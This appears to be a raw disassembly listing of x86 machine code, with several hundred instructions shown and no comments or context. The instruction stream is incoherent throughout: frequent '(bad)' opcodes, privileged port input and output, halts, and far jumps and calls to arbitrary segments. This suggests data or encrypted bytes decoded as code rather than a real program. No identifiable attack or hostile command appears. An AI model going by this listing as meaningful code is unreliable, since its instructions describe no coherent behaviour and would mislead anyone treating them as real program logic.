  41eef8:	jbe    0x41ef41
  41eefa:	mov    ds:0x355bc960,al
  41eeff:	cmp    al,0x32
  41ef01:	add    dh,BYTE PTR [esi+0x74be4a23]
  41ef07:	out    dx,al
  41ef08:	(bad)  
  41ef09:	retf   
  41ef0a:	inc    edx
  41ef0b:	mov    eax,0x9be2026b
  41ef10:	push   eax
  41ef11:	stos   DWORD PTR es:[edi],eax
  41ef12:	mov    al,ds:0x471f0ec4
  41ef17:	dec    ecx
  41ef18:	iret   
  41ef19:	outs   dx,DWORD PTR ds:[esi]
  41ef1a:	sti    
  41ef1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef1c:	sub    eax,0x6cf62dce
  41ef21:	and    cl,BYTE PTR [eax]
  41ef23:	(bad)  [eax+eiz*8+0x3b]
  41ef27:	dec    ebp
  41ef28:	push   ebx
  41ef29:	call   0xf9a6:0x65a5c060
  41ef30:	mov    ss,WORD PTR [ebp+0x70]
  41ef33:	push   0xffffff94
  41ef35:	and    DWORD PTR [ebp+0x4ee8ed8f],0x5ae1f50a
  41ef3f:	push   ebp
  41ef40:	cwde   
  41ef41:	cmp    al,0xfa
  41ef43:	jg     0x41ef4b
  41ef45:	(bad)  
  41ef46:	cs cs add ch,0xa3
  41ef4b:	cmp    bh,BYTE PTR [eax+0x71e07ce5]
  41ef51:	iret   
  41ef52:	sahf   
  41ef53:	and    bh,BYTE PTR [ebx-0x80]
  41ef56:	cli    
  41ef57:	dec    ecx
  41ef58:	fcomp  QWORD PTR [ecx-0x31]
  41ef5b:	xchg   ebp,eax
  41ef5c:	mov    al,0x46
  41ef5e:	icebp  
  41ef5f:	jmp    0x6d44:0xbf63b7ab
  41ef66:	(bad)  
  41ef67:	adc    dh,al
  41ef69:	xor    eax,0xc7da325e
  41ef6e:	mov    esi,DWORD PTR ds:0x84673653
  41ef74:	sbb    dh,BYTE PTR [edi]
  41ef76:	mov    ?,WORD PTR [edi-0x76]
  41ef79:	sub    BYTE PTR [edi-0x7e2141fd],ah
  41ef7f:	sub    eax,0x6c08bae6
  41ef84:	mov    ebx,0x2861fb4f
  41ef89:	cld    
  41ef8a:	xor    al,0x31
  41ef8c:	xchg   edi,eax
  41ef8d:	pop    edi
  41ef8e:	pop    ebx
  41ef8f:	mov    al,ds:0xae6263dd
  41ef94:	sahf   
  41ef95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef96:	jmp    0x90deadee
  41ef9b:	pop    eax
  41ef9c:	mov    bl,0x6
  41ef9e:	aad    0x7b
  41efa0:	lods   eax,DWORD PTR ds:[esi]
  41efa1:	aas    
  41efa2:	dec    edx
  41efa3:	xchg   ebp,eax
  41efa4:	inc    ecx
  41efa5:	daa    
  41efa6:	fwait
  41efa7:	loop   0x41ef6c
  41efa9:	cmp    BYTE PTR [ebx+0x2efcad48],bl
  41efaf:	fcmovu st,st(7)
  41efb1:	jecxz  0x41efbe
  41efb3:	jmp    0x147252e9
  41efb8:	in     eax,0xbe
  41efba:	push   esi
  41efbb:	adc    DWORD PTR [esi],esp
  41efbd:	clc    
  41efbe:	(bad)  
  41efbf:	cmp    bl,dl
  41efc1:	pop    esp
  41efc2:	nop    esp
  41efc5:	sbb    al,0xaf
  41efc7:	push   0xd016dd9a
  41efcc:	mov    ds:0xa8f0f7ba,al
  41efd1:	jmp    0x483373e5
  41efd6:	shl    BYTE PTR [esi+0x5c125812],1
  41efdc:	or     al,0x6b
  41efde:	cmp    cl,dl
  41efe0:	mov    bh,0x92
  41efe2:	out    0x4,al
  41efe4:	pop    esi
  41efe5:	mov    ecx,0x9f43213b
  41efea:	jge    0x41efb8
  41efec:	stos   BYTE PTR es:[edi],al
  41efed:	aam    0x72
  41efef:	enter  0x5938,0xe0
  41eff3:	push   edi
  41eff4:	adc    eax,0x1a07e9d3
  41eff9:	loop   0x41f066
  41effb:	loope  0x41efb2
  41effd:	mov    eax,0xf82d482e
  41f002:	and    esp,DWORD PTR [esi]
  41f004:	sub    al,0x38
  41f006:	int3   
  41f007:	mov    ebx,0xc1040e66
  41f00c:	and    DWORD PTR cs:[ebp+0x6e],esi
  41f010:	add    DWORD PTR [esi],ecx
  41f012:	fcom   QWORD PTR [ebx+0x21536488]
  41f018:	retf   
  41f019:	push   ebx
  41f01a:	loope  0x41efdc
  41f01c:	sub    esp,ecx
  41f01e:	(bad)  
  41f01f:	fadd   DWORD PTR [ecx+0x15]
  41f022:	fldenv [ebx-0xa]
  41f025:	out    dx,al
  41f026:	(bad)  
  41f027:	or     edi,DWORD PTR [ecx+0x7d129361]
  41f02d:	shr    DWORD PTR ds:0x3f571df1,cl
  41f033:	and    ebp,DWORD PTR [edx+0x1d]
  41f036:	and    DWORD PTR [eax-0x9],ebx
  41f039:	mov    cl,0x66
  41f03b:	push   edi
  41f03c:	dec    esp
  41f03d:	cld    
  41f03e:	rcr    BYTE PTR [edx],1
  41f040:	add    esi,DWORD PTR ds:0xf7ca5dad
  41f046:	mov    eax,0x1cfb9e0a
  41f04b:	pop    eax
  41f04c:	cmp    cl,BYTE PTR [edi]
  41f04e:	jmp    0x76f6:0x8bcc0b73
  41f055:	idiv   BYTE PTR [edi]
  41f057:	aam    0x5a
  41f059:	lods   al,BYTE PTR ds:[esi]
  41f05a:	mov    ebp,0xa4d97cc3
  41f05f:	retf   
  41f060:	shl    BYTE PTR [esi-0x290e419f],1
  41f066:	lock outs dx,BYTE PTR ds:[esi]
  41f068:	leave  
  41f069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f06a:	out    dx,al
  41f06b:	call   0xabe85f70
  41f070:	sbb    DWORD PTR cs:[ebp+0x43581402],esi
  41f077:	leave  
  41f078:	jno    0x41f016
  41f07a:	or     DWORD PTR [edx],eax
  41f07c:	sar    DWORD PTR [ebx],1
  41f07e:	ja     0x41f036
  41f080:	retf   
  41f081:	fistp  DWORD PTR [esi-0x10]
  41f084:	idiv   BYTE PTR [edi]
  41f086:	stos   DWORD PTR es:[edi],eax
  41f087:	nop
  41f088:	fadd   st,st(1)
  41f08a:	push   edi
  41f08b:	cmp    ch,BYTE PTR [ebp-0x46f195af]
  41f091:	and    BYTE PTR [ebp+0x3541f953],dl
  41f097:	xor    BYTE PTR [edx],al
  41f099:	or     ch,ah
  41f09b:	ins    BYTE PTR es:[edi],dx
  41f09c:	sbb    DWORD PTR [ebp-0xabb6dc9],0xffffff89
  41f0a3:	test   al,0xe2
  41f0a5:	mov    BYTE PTR [ebp+0x7e],ah
  41f0a8:	sti    
  41f0a9:	fs js  0x41f08f
  41f0ac:	test   eax,0x57d158d8
  41f0b1:	xchg   ecx,eax
  41f0b2:	add    ecx,eax
  41f0b4:	xlat   BYTE PTR ds:[ebx]
  41f0b5:	xadd   DWORD PTR [eax+0x7],esp
  41f0b9:	sub    DWORD PTR [eax-0x3cbb6043],edi
  41f0bf:	dec    edx
  41f0c0:	adc    eax,0x8128607
  41f0c5:	jle    0x41f126
  41f0c7:	popa   
  41f0c8:	mov    ebx,0x19b207c8
  41f0cd:	add    eax,0xbfb0945a
  41f0d2:	add    DWORD PTR [ebx-0x3fe7fd6f],0xffffffda
  41f0d9:	jnp    0x41f155
  41f0db:	inc    edx
  41f0dc:	ret    
  41f0dd:	mov    ah,0x87
  41f0df:	pop    es
  41f0e0:	mov    dl,0x1
  41f0e2:	call   0x5b390b77
  41f0e7:	inc    esi
  41f0e8:	jnp    0x41f100
  41f0ea:	inc    eax
  41f0eb:	imul   DWORD PTR [edx-0x32]
  41f0ee:	jecxz  0x41f0c0
  41f0f0:	mov    ds:0xa04e4976,al
  41f0f5:	aam    0x78
  41f0f7:	(bad)  
  41f0f8:	jo     0x41f135
  41f0fa:	mov    ch,0xd5
  41f0fc:	shr    DWORD PTR [ebx+0x7e2d50be],0x14
  41f103:	mov    ?,WORD PTR [ebp-0x54]
  41f106:	xchg   BYTE PTR [edi+ecx*2+0xf],bh
  41f10a:	or     al,0xa9
  41f10c:	fld    QWORD PTR [esi]
  41f10e:	push   edx
  41f10f:	add    eax,0xc9061b99
  41f114:	jmp    0x3626:0xf691045e
  41f11b:	xchg   edx,eax
  41f11c:	and    al,0x86
  41f11e:	call   0x3741:0x519a9bf7
  41f125:	js     0x41f0de
  41f127:	jge    0x41f10f
  41f129:	bswap  eax
  41f12b:	mov    ecx,0x31f39122
  41f130:	xor    al,0x69
  41f132:	fist   WORD PTR ds:0x639b29c9
  41f138:	imul   edx,DWORD PTR [eax+0xbd8af69],0xffffffd7
  41f13f:	daa    
  41f140:	hlt    
  41f141:	mov    WORD PTR [edx],ds
  41f143:	inc    edx
  41f144:	jno    0x41f116
  41f146:	(bad)  
  41f147:	nop
  41f148:	fs fs jg 0x41f104
  41f14c:	bound  ebp,QWORD PTR [edi+0x5f2a8d85]
  41f152:	mov    ?,WORD PTR [esi+0x3f5b27bd]
  41f158:	jbe    0x41f1b3
  41f15a:	pushf  
  41f15b:	mov    al,0x76
  41f15d:	and    eax,ecx
  41f15f:	jmp    0x5a71c1fb
  41f164:	std    
  41f165:	or     al,dl
  41f167:	mov    ebx,0xfec9867f
  41f16c:	jbe    0x41f1a8
  41f16e:	cdq    
  41f16f:	jns    0x41f10a
  41f171:	stc    
  41f172:	xchg   ebx,eax
  41f173:	mov    esi,edi
  41f175:	fbld   TBYTE PTR [ebx]
  41f177:	mov    ds:0xe1f2e959,eax
  41f17c:	ds and eax,0xab5ca9ce
  41f182:	test   ch,dl
  41f184:	pop    edi
  41f185:	stos   DWORD PTR es:[edi],eax
  41f186:	aad    0x19
  41f188:	sbb    al,0x11
  41f18a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f18b:	cmp    eax,0x9c763248
  41f190:	jno    0x41f1f1
  41f192:	adc    DWORD PTR [edx+0x32],ebx
  41f195:	fmul   st,st(1)
  41f197:	fist   DWORD PTR [edi]
  41f199:	lock xchg edi,eax
  41f19b:	sar    BYTE PTR [edi],0x5f
  41f19e:	lock jecxz 0x41f1da
  41f1a1:	sbb    al,0x6a
  41f1a3:	sub    eax,0xefd814ee
  41f1a8:	leave  
  41f1a9:	int    0x48
  41f1ab:	scas   al,BYTE PTR es:[edi]
  41f1ac:	popf   
  41f1ad:	enter  0x346c,0x1f
  41f1b1:	out    0x19,eax
  41f1b3:	and    BYTE PTR [edx],bh
  41f1b5:	test   BYTE PTR [eax+0x5e02a970],ah
  41f1bb:	idiv   DWORD PTR [esi-0x5c]
  41f1be:	inc    ecx
  41f1bf:	jbe    0x41f1cd
  41f1c1:	pop    es
  41f1c2:	retf   0x2233
  41f1c5:	jnp    0x41f233
  41f1c7:	mov    ds:0x29285f7c,eax
  41f1cc:	pop    ecx
  41f1cd:	iret   
  41f1ce:	pushf  
  41f1cf:	add    edx,DWORD PTR [edx+eax*8-0x62ded6cc]
  41f1d6:	or     al,0xfb
  41f1d8:	add    DWORD PTR [eax+0xcd72b09],ecx
  41f1de:	gs jmp 0x41f22c
  41f1e1:	dec    ebp
  41f1e2:	(bad)  
  41f1e4:	(bad)  
  41f1e5:	call   0xf3fbea9d
  41f1ea:	mov    ds:0xd0463,eax
  41f1ef:	jnp    0x41f224
  41f1f1:	(bad)  
  41f1f2:	mov    esp,0x4b68b648
  41f1f7:	pop    ecx
  41f1f8:	cmp    esp,0x26
  41f1fb:	das    
  41f1fc:	fild   WORD PTR [esi]
  41f1fe:	leave  
  41f1ff:	into   
  41f200:	retf   0x54d5
  41f203:	lea    eax,[edx]
  41f205:	inc    esi
  41f206:	adc    BYTE PTR [edx],dh
  41f208:	xchg   DWORD PTR [edx+0x397729cb],esi
  41f20e:	into   
  41f20f:	or     DWORD PTR [ebp-0x61d6bd81],esp
  41f215:	add    BYTE PTR [ebp-0x3bcda6c2],dl
  41f21b:	inc    eax
  41f21c:	jno    0x41f22e
  41f21e:	push   esi
  41f21f:	int    0xe
  41f221:	dec    ebx
  41f222:	shl    BYTE PTR [edx-0x2f],0x2
  41f226:	std    
  41f227:	push   ebp
  41f228:	mov    ebp,0x40bbe5cb
  41f22d:	jp     0x41f1ee
  41f22f:	mov    ds:0xd5277d3a,al
  41f234:	xchg   ecx,eax
  41f235:	xchg   ebx,eax
  41f236:	pop    ebp
  41f237:	out    0x97,eax
  41f239:	push   ebx
  41f23a:	jno    0x41f1ca
  41f23c:	icebp  
  41f23d:	ins    DWORD PTR es:[edi],dx
  41f23e:	into   
  41f23f:	dec    esp
  41f240:	and    BYTE PTR [eax+esi*8-0x37f0dc98],cl
  41f247:	adc    ah,BYTE PTR [eax]
  41f249:	cmp    DWORD PTR [ebx],edi
  41f24b:	les    edi,FWORD PTR [esi+0x775da32f]
  41f251:	inc    ebp
  41f252:	in     al,dx
  41f253:	(bad)  
  41f254:	in     al,0x63
  41f256:	shr    DWORD PTR [ecx],0x7d
  41f259:	mov    eax,0xe04e9d93
  41f25e:	lods   al,BYTE PTR ds:[esi]
  41f25f:	das    
  41f260:	popf   
  41f261:	pop    ss
  41f262:	jbe    0x41f207
  41f264:	fwait
  41f265:	push   ds
  41f266:	cdq    
  41f267:	dec    edi
  41f268:	sub    DWORD PTR [ebx+ebp*2-0x1246b6cb],ebx
  41f26f:	imul   edi,DWORD PTR [ebx],0x8563e477
  41f275:	not    al
  41f277:	es xor ebp,esi
  41f27a:	ja     0x41f214
  41f27c:	sti    
  41f27d:	gs dec ecx
  41f27f:	jno    0x41f233
  41f281:	jne    0x41f283
  41f283:	inc    ebp
  41f284:	int    0x32
  41f286:	(bad)  
  41f287:	or     DWORD PTR [ecx],0x68
  41f28a:	sub    DWORD PTR [ecx-0x66c59453],ebx
  41f290:	add    cl,BYTE PTR [eax+edi*1]
  41f293:	mov    eax,ds:0xbbfb8c1f
  41f298:	test   DWORD PTR [eax+0x37],esp
  41f29b:	or     bh,BYTE PTR [ebp+edx*2+0x1f5cefb4]
  41f2a2:	daa    
  41f2a3:	sahf   
  41f2a4:	adc    DWORD PTR [edi+0x5eaec14f],0x2375076f
  41f2ae:	(bad)  
  41f2af:	in     eax,0xd5
  41f2b1:	cmp    DWORD PTR [ebp-0x63],edx
  41f2b4:	test   eax,0x72720e80
  41f2b9:	lods   eax,DWORD PTR ds:[esi]
  41f2ba:	and    al,0xa5
  41f2bc:	push   ebp
  41f2bd:	inc    ecx
  41f2be:	xchg   edi,eax
  41f2bf:	cmc    
  41f2c0:	arpl   WORD PTR [ecx+0x3e],cx
  41f2c3:	and    al,0x89
  41f2c5:	pop    ss
  41f2c6:	iret   
  41f2c7:	enter  0xb33a,0x15
  41f2cb:	cmp    ch,al
  41f2cd:	cmp    ch,cl
  41f2cf:	xchg   DWORD PTR [ebx+edx*2],esi
  41f2d2:	dec    ebp
  41f2d3:	jecxz  0x41f30a
  41f2d5:	rcl    BYTE PTR ds:0xadba2e1b,1
  41f2db:	adc    eax,esi
  41f2dd:	sbb    eax,DWORD PTR [ebx]
  41f2df:	adc    ecx,DWORD PTR [ebx]
  41f2e1:	pop    esi
  41f2e2:	(bad)  
  41f2e3:	mov    ebp,0xe8257efc
  41f2e8:	sub    esp,DWORD PTR [eax-0x4c]
  41f2eb:	test   cl,dl
  41f2ed:	xor    al,0x34
  41f2ef:	mov    esp,0xee1caeeb
  41f2f4:	mov    edi,0x942147da
  41f2f9:	cmp    al,0xa9
  41f2fb:	fnsave [edx+0x9]
  41f2fe:	repz mov WORD PTR [esi-0x1112ee91],cs
  41f305:	mov    BYTE PTR [eax+0x68],bh
  41f308:	xchg   ebp,eax
  41f309:	mov    bh,0x41
  41f30b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f30c:	lea    edi,[ebp+0x5c]
  41f30f:	mov    ch,0x3a
  41f311:	ins    DWORD PTR es:[edi],dx
  41f312:	inc    edx
  41f313:	push   ebp
  41f314:	xchg   ecx,eax
  41f315:	xor    al,0x45
  41f317:	aaa    
  41f318:	in     eax,dx
  41f319:	mov    dl,0xd4
  41f31b:	scas   al,BYTE PTR es:[edi]
  41f31c:	mov    dh,BYTE PTR [edx+0x71]
  41f31f:	xor    BYTE PTR [eax+0x5d36aa3c],cl
  41f325:	jl     0x41f366
  41f327:	mov    eax,0x6d1488b
  41f32c:	adc    eax,0x3fac1167
  41f331:	add    eax,0x4fa70fe9
  41f336:	(bad)  
  41f337:	and    DWORD PTR [eax],ebx
  41f339:	push   ds
  41f33a:	jnp    0x41f322
  41f33c:	icebp  
  41f33d:	rcl    DWORD PTR [edx-0x319f9cef],1
  41f343:	nop
  41f344:	mov    bh,0x93
  41f346:	jns    0x41f3c6
  41f348:	pop    es
  41f349:	mov    cl,0xfc
  41f34b:	mov    edx,0x6845b2b3
  41f350:	in     al,0x95
  41f352:	outs   dx,BYTE PTR ds:[esi]
  41f353:	inc    esi
  41f354:	out    0x4c,al
  41f356:	int3   
  41f357:	out    dx,al
  41f358:	sbb    al,0xec
  41f35a:	stos   DWORD PTR es:[edi],eax
  41f35b:	xchg   esp,eax
  41f35c:	and    BYTE PTR [eax+0x5],ch
  41f35f:	in     al,0xb6
  41f361:	jno    0x41f2f9
  41f363:	inc    ebx
  41f364:	and    eax,0xe44c5c6c
  41f369:	lock fs cdq 
  41f36c:	add    eax,0xec449404
  41f371:	xor    esi,DWORD PTR [edx-0x2b]
  41f374:	inc    edx
  41f375:	rcl    BYTE PTR ds:0xf2580be,cl
  41f37b:	inc    esi
  41f37c:	test   al,0x69
  41f37e:	or     cl,BYTE PTR [edi+0x137f958b]
  41f384:	pop    esi
  41f385:	test   BYTE PTR [edi+ebp*8],dh
  41f388:	sub    al,0xdf
  41f38a:	in     al,0x81
  41f38c:	call   0x7b8c:0x2104501d
  41f393:	jg     0x41f37d
  41f395:	mov    ebx,0x98f1a3d9
  41f39a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f39b:	add    al,0x48
  41f39d:	sbb    DWORD PTR [eax*8-0x4fb5979e],0xffffffdc
  41f3a5:	icebp  
  41f3a6:	sti    
  41f3a7:	adc    ch,BYTE PTR [eax]
  41f3a9:	into   
  41f3aa:	xchg   edx,eax
  41f3ab:	add    DWORD PTR [ebx-0x63eda49a],ecx
  41f3b1:	push   es
  41f3b2:	xchg   edi,edi
  41f3b4:	clc    
  41f3b5:	mov    al,ds:0x4dd6bdf
  41f3ba:	pop    eax
  41f3bb:	push   cs
  41f3bc:	cli    
  41f3bd:	fsub   DWORD PTR [edi-0x1d48567d]
  41f3c3:	pop    edi
  41f3c4:	xor    BYTE PTR [ebx],0xa4
  41f3c7:	mov    al,ds:0xa8e4b333
  41f3cc:	inc    eax
  41f3cd:	and    BYTE PTR [ebx+0x10],ch
  41f3d0:	pop    edi
  41f3d1:	cmp    eax,0x4a1b493e
  41f3d6:	and    edi,esp
  41f3d8:	icebp  
  41f3d9:	sub    DWORD PTR [esi-0x22],ecx
  41f3dc:	aaa    
  41f3dd:	lods   eax,DWORD PTR ds:[esi]
  41f3de:	xchg   ebx,eax
  41f3df:	push   dx
  41f3e1:	out    0x7,al
  41f3e3:	mov    al,ds:0xe5a2342b
  41f3e8:	cmp    esi,DWORD PTR [ecx]
  41f3ea:	xchg   ebp,eax
  41f3eb:	rcr    bl,1
  41f3ed:	mov    ds:0x75446ff1,al
  41f3f2:	cli    
  41f3f3:	jb     0x41f3b6
  41f3f5:	sbb    DWORD PTR [ecx],ecx
  41f3f7:	dec    esp
  41f3f8:	sbb    BYTE PTR [edx],dh
  41f3fa:	cwde   
  41f3fb:	pop    esp
  41f3fc:	xor    ebx,edi
  41f3fe:	or     al,bh
  41f400:	stos   BYTE PTR es:[edi],al
  41f401:	cli    
  41f402:	arpl   WORD PTR [eax-0x7df8ba02],ax
  41f408:	ins    DWORD PTR es:[edi],dx
  41f409:	sahf   
  41f40a:	mov    eax,0xf9aa3fad
  41f40f:	lods   eax,DWORD PTR ds:[esi]
  41f410:	add    ch,ah
  41f412:	cmc    
  41f413:	addr16 sbb eax,0xc331ac75
  41f419:	and    BYTE PTR [ecx+0x183e68a3],cl
  41f41f:	aaa    
  41f420:	fsub   st(0),st
  41f422:	sub    esp,0x5b
  41f425:	inc    ebp
  41f426:	inc    esp
  41f427:	xchg   edx,eax
  41f428:	ret    
  41f429:	sbb    al,0x42
  41f42b:	iret   
  41f42c:	inc    esp
  41f42d:	cmp    eax,0xb2c968d4
  41f432:	and    BYTE PTR [ecx-0x70],0x5
  41f436:	pop    ebp
  41f437:	mov    cl,0x26
  41f439:	sbb    edx,ecx
  41f43b:	adc    DWORD PTR [edx],edx
  41f43d:	out    0x56,eax
  41f43f:	pop    ss
  41f440:	ja     0x41f420
  41f442:	aaa    
  41f443:	mov    ds:0x7136322b,al
  41f448:	fcmovnbe st,st(2)
  41f44a:	int3   
  41f44b:	dec    ebp
  41f44c:	lock les esi,FWORD PTR [ebp+0x73]
  41f450:	cmp    DWORD PTR [eax+0x77356bd9],ebp
  41f456:	push   cs
  41f457:	pop    es
  41f458:	xchg   edx,eax
  41f459:	mov    edx,0xe7718ac4
  41f45e:	push   esi
  41f45f:	mov    edx,0x61b8963
  41f464:	arpl   WORD PTR [edx+ebx*1+0x1a70cf0d],cx
  41f46b:	xchg   ecx,eax
  41f46c:	fdivp  st(3),st
  41f46e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f470:	scas   eax,DWORD PTR es:[edi]
  41f471:	ja     0x41f408
  41f473:	pop    esi
  41f474:	loopne 0x41f4b3
  41f476:	sbb    BYTE PTR [edx+0x250dda1e],bl
  41f47c:	inc    ebx
  41f47d:	push   eax
  41f47e:	dec    eax
  41f47f:	ret    
  41f480:	xor    edx,DWORD PTR [edi]
  41f482:	add    ah,BYTE PTR [edx]
  41f484:	ins    DWORD PTR es:[edi],dx
  41f485:	mov    edx,0x2539bf24
  41f48a:	push   cs
  41f48b:	push   cs
  41f48c:	popa   
  41f48d:	sub    edi,ecx
  41f48f:	mov    dh,0xf7
  41f491:	mov    al,ds:0xcabed243
  41f496:	imul   edx,DWORD PTR [ecx*1+0x2c5f0745],0xffffff9b
  41f49e:	jl     0x41f44c
  41f4a0:	jge    0x41f475
  41f4a2:	jne    0x41f4be
  41f4a4:	test   eax,edi
  41f4a6:	xchg   edx,eax
  41f4a7:	(bad)  [esi+0x48]
  41f4aa:	xchg   ebx,eax
  41f4ab:	sbb    DWORD PTR [ecx],0xffffffb0
  41f4ae:	sahf   
  41f4af:	or     BYTE PTR [edi+0x33b82ec9],dh
  41f4b5:	shl    ebx,cl
  41f4b7:	cmp    al,0x54
  41f4b9:	shr    BYTE PTR [ecx],1
  41f4bb:	hlt    
  41f4bc:	mov    ds:0xe6f6ad52,al
  41f4c1:	mov    esp,0x495c9da1
  41f4c6:	inc    esi
  41f4c7:	mov    ch,0xb6
  41f4c9:	icebp  
  41f4ca:	xor    ch,BYTE PTR [esi-0x8]
  41f4cd:	jmp    0x41f4c0
  41f4cf:	xchg   BYTE PTR [edx-0x67],al
  41f4d2:	enter  0x89b6,0x9c
  41f4d6:	aaa    
  41f4d7:	lods   eax,DWORD PTR ds:[esi]
  41f4d8:	in     al,0x2e
  41f4da:	sub    bl,BYTE PTR [ecx]
  41f4dc:	stos   DWORD PTR es:[edi],eax
  41f4dd:	gs lock adc al,0x50
  41f4e1:	pop    esp
  41f4e2:	or     edi,esp
  41f4e4:	adc    al,0xf
  41f4e6:	sub    esp,DWORD PTR [eax+edx*8-0x4a5a2667]
  41f4ed:	cwde   
  41f4ee:	addr16 jnp 0x41f476
  41f4f1:	(bad)  
  41f4f2:	test   eax,0x257e013c
  41f4f7:	sub    eax,DWORD PTR [esi]
  41f4f9:	adc    eax,0x9ac1165a
  41f4fe:	sahf   
  41f4ff:	cli    
  41f500:	(bad)  
  41f502:	or     bh,0xc2
  41f505:	push   cs
  41f506:	jno    0x41f53a
  41f508:	or     al,0xc3
  41f50a:	test   ebp,0xde4b733b
  41f510:	pusha  
  41f511:	fnsave [ecx+0x2092f7cf]
  41f517:	fisub  DWORD PTR [ebx+0x70b6ec36]
  41f51d:	sbb    eax,0x70db4b18
  41f522:	aas    
  41f523:	sar    BYTE PTR [esi],cl
  41f525:	call   0xc7a1:0x6814d47f
  41f52c:	mov    dh,0xf0
  41f52e:	dec    eax
  41f52f:	and    BYTE PTR [edi+0x3c],dh
  41f532:	xchg   ebx,eax
  41f533:	lods   eax,DWORD PTR ds:[esi]
  41f534:	test   DWORD PTR [ecx],esp
  41f536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f537:	adc    ch,BYTE PTR [ecx+0x4d93c93e]
  41f53d:	xchg   edi,eax
  41f53e:	aam    0x25
  41f540:	xor    al,0x8a
  41f542:	or     eax,0x5b7ec5ed
  41f547:	lods   eax,DWORD PTR ds:[esi]
  41f548:	nop
  41f549:	dec    esi
  41f54a:	dec    ebp
  41f54b:	xor    BYTE PTR [ebx+0x40045d2e],dl
  41f551:	mov    ah,0x51
  41f553:	push   esp
  41f554:	cmp    BYTE PTR [edx],0xd0
  41f557:	into   
  41f558:	das    
  41f559:	sbb    BYTE PTR [ecx+ebx*4+0xcf06fa6],cl
  41f560:	repz pop ecx
  41f562:	mov    ds:0x45b1ac84,al
  41f567:	ja     0x41f5db
  41f569:	cmp    ch,BYTE PTR [edx+0x1db710cc]
  41f56f:	cmp    BYTE PTR [edi+0x14fedfe],bl
  41f575:	cmp    al,cl
  41f577:	ret    0xe05c
  41f57a:	jb     0x41f513
  41f57c:	add    BYTE PTR [ebx],ah
  41f57e:	repz fldenvw [ebx+0x26b89856]
  41f586:	add    ch,BYTE PTR [ebx]
  41f588:	xchg   ebp,eax
  41f589:	enter  0xb679,0x37
  41f58d:	cmp    esi,DWORD PTR [eax+0x2e]
  41f590:	mov    ah,0xc1
  41f592:	frstor [eax]
  41f594:	test   BYTE PTR [edx+0x9],al
  41f597:	(bad)  
  41f598:	xlat   BYTE PTR ds:[ebx]
  41f599:	(bad)  
  41f59a:	int    0x7e
  41f59c:	push   esi
  41f59d:	mov    ch,0x23
  41f59f:	enter  0xbcbd,0xc8
  41f5a3:	lds    esi,FWORD PTR [ebx-0x58]
  41f5a6:	mov    dl,0xbc
  41f5a8:	xchg   ebp,eax
  41f5a9:	adc    al,0xc6
  41f5ab:	cmp    BYTE PTR [edx],0x68
  41f5ae:	mov    ebx,0xda7b3133
  41f5b3:	ds push es
  41f5b5:	ins    BYTE PTR es:[edi],dx
  41f5b6:	daa    
  41f5b7:	jo     0x41f61a
  41f5b9:	scas   eax,DWORD PTR es:[edi]
  41f5ba:	lds    edx,FWORD PTR [eax+0xdd14346]
  41f5c0:	xchg   edx,eax
  41f5c1:	or     di,WORD PTR [ebx]
  41f5c4:	fidiv  DWORD PTR [bp+di]
  41f5c7:	nop
  41f5c8:	inc    esi
  41f5c9:	sbb    al,BYTE PTR cs:0x5134256c
  41f5d0:	dec    esp
  41f5d1:	sti    
  41f5d2:	loope  0x41f5f1
  41f5d4:	push   eax
  41f5d5:	add    BYTE PTR [ebp-0x24d5e393],0x30
  41f5dc:	sub    dh,BYTE PTR [edi-0x495a6e2d]
  41f5e2:	fchs   
  41f5e4:	add    DWORD PTR [ebp+ecx*2-0x41],ebp
  41f5e8:	xchg   ebx,eax
  41f5e9:	call   0xa3945b9b
  41f5ee:	out    0xfe,eax
  41f5f0:	inc    eax
  41f5f1:	push   esi
  41f5f2:	jne    0x41f5ed
  41f5f4:	(bad)  [ebp+esi*8+0x5b479ea1]
  41f5fb:	std    
  41f5fc:	je     0x41f62b
  41f5fe:	sub    al,0xef
  41f601:	lahf   
  41f602:	sar    DWORD PTR [ecx],0x70
  41f605:	retf   0x2ea6
  41f608:	and    edi,DWORD PTR [esi+edx*1-0x71]
  41f60c:	xchg   BYTE PTR [ecx-0x5b],ch
  41f60f:	adc    eax,0x3f93f6d
  41f614:	mov    edi,0x6ca8784b
  41f619:	outs   dx,BYTE PTR ds:[esi]
  41f61a:	sar    BYTE PTR [edi],1
  41f61c:	gs push cs
  41f61e:	push   ecx
  41f61f:	sbb    ebp,DWORD PTR [esi+ebx*2]
  41f622:	mov    ss,eax
  41f624:	cmp    bh,cl
  41f626:	enter  0xa07e,0xf9
  41f62a:	pop    ds
  41f62b:	or     BYTE PTR [edi-0x1e],ch
  41f62e:	cmp    eax,0x2a0bb56
  41f633:	or     eax,0xf423b33e
  41f638:	dec    eax
  41f639:	dec    edx
  41f63a:	fwait
  41f63b:	and    eax,0xe81497be
  41f640:	je     0x41f621
  41f642:	rol    edx,0x5e
  41f645:	fucomip st,st(5)
  41f647:	(bad)  
  41f648:	out    0xd7,eax
  41f64a:	outs   dx,DWORD PTR ds:[esi]
  41f64b:	or     al,0x7c
  41f64d:	xor    esi,DWORD PTR ds:0x965e9018
  41f653:	lock add ch,BYTE PTR [ebp+0x21]
  41f657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f658:	stc    
  41f659:	pop    edx
  41f65a:	inc    edx
  41f65b:	sar    DWORD PTR [edi],1
  41f65d:	icebp  
  41f65e:	cmp    DWORD PTR [esi-0x3b8aa51b],esp
  41f664:	dec    esp
  41f665:	das    
  41f666:	ins    DWORD PTR es:[edi],dx
  41f667:	dec    ecx
  41f668:	push   edi
  41f669:	dec    ecx
  41f66a:	push   ds
  41f66b:	inc    edi
  41f66c:	jmp    0x2647:0xcb790fd5
  41f673:	test   DWORD PTR [ecx],ebx
  41f675:	int    0xc3
  41f677:	adc    cl,BYTE PTR ds:0xc31b0840
  41f67d:	pusha  
  41f67e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f67f:	retf   0x8ec7
  41f682:	and    ch,BYTE PTR [edx+0x40]
  41f685:	mov    ebp,0x35a00821
  41f68a:	lock daa 
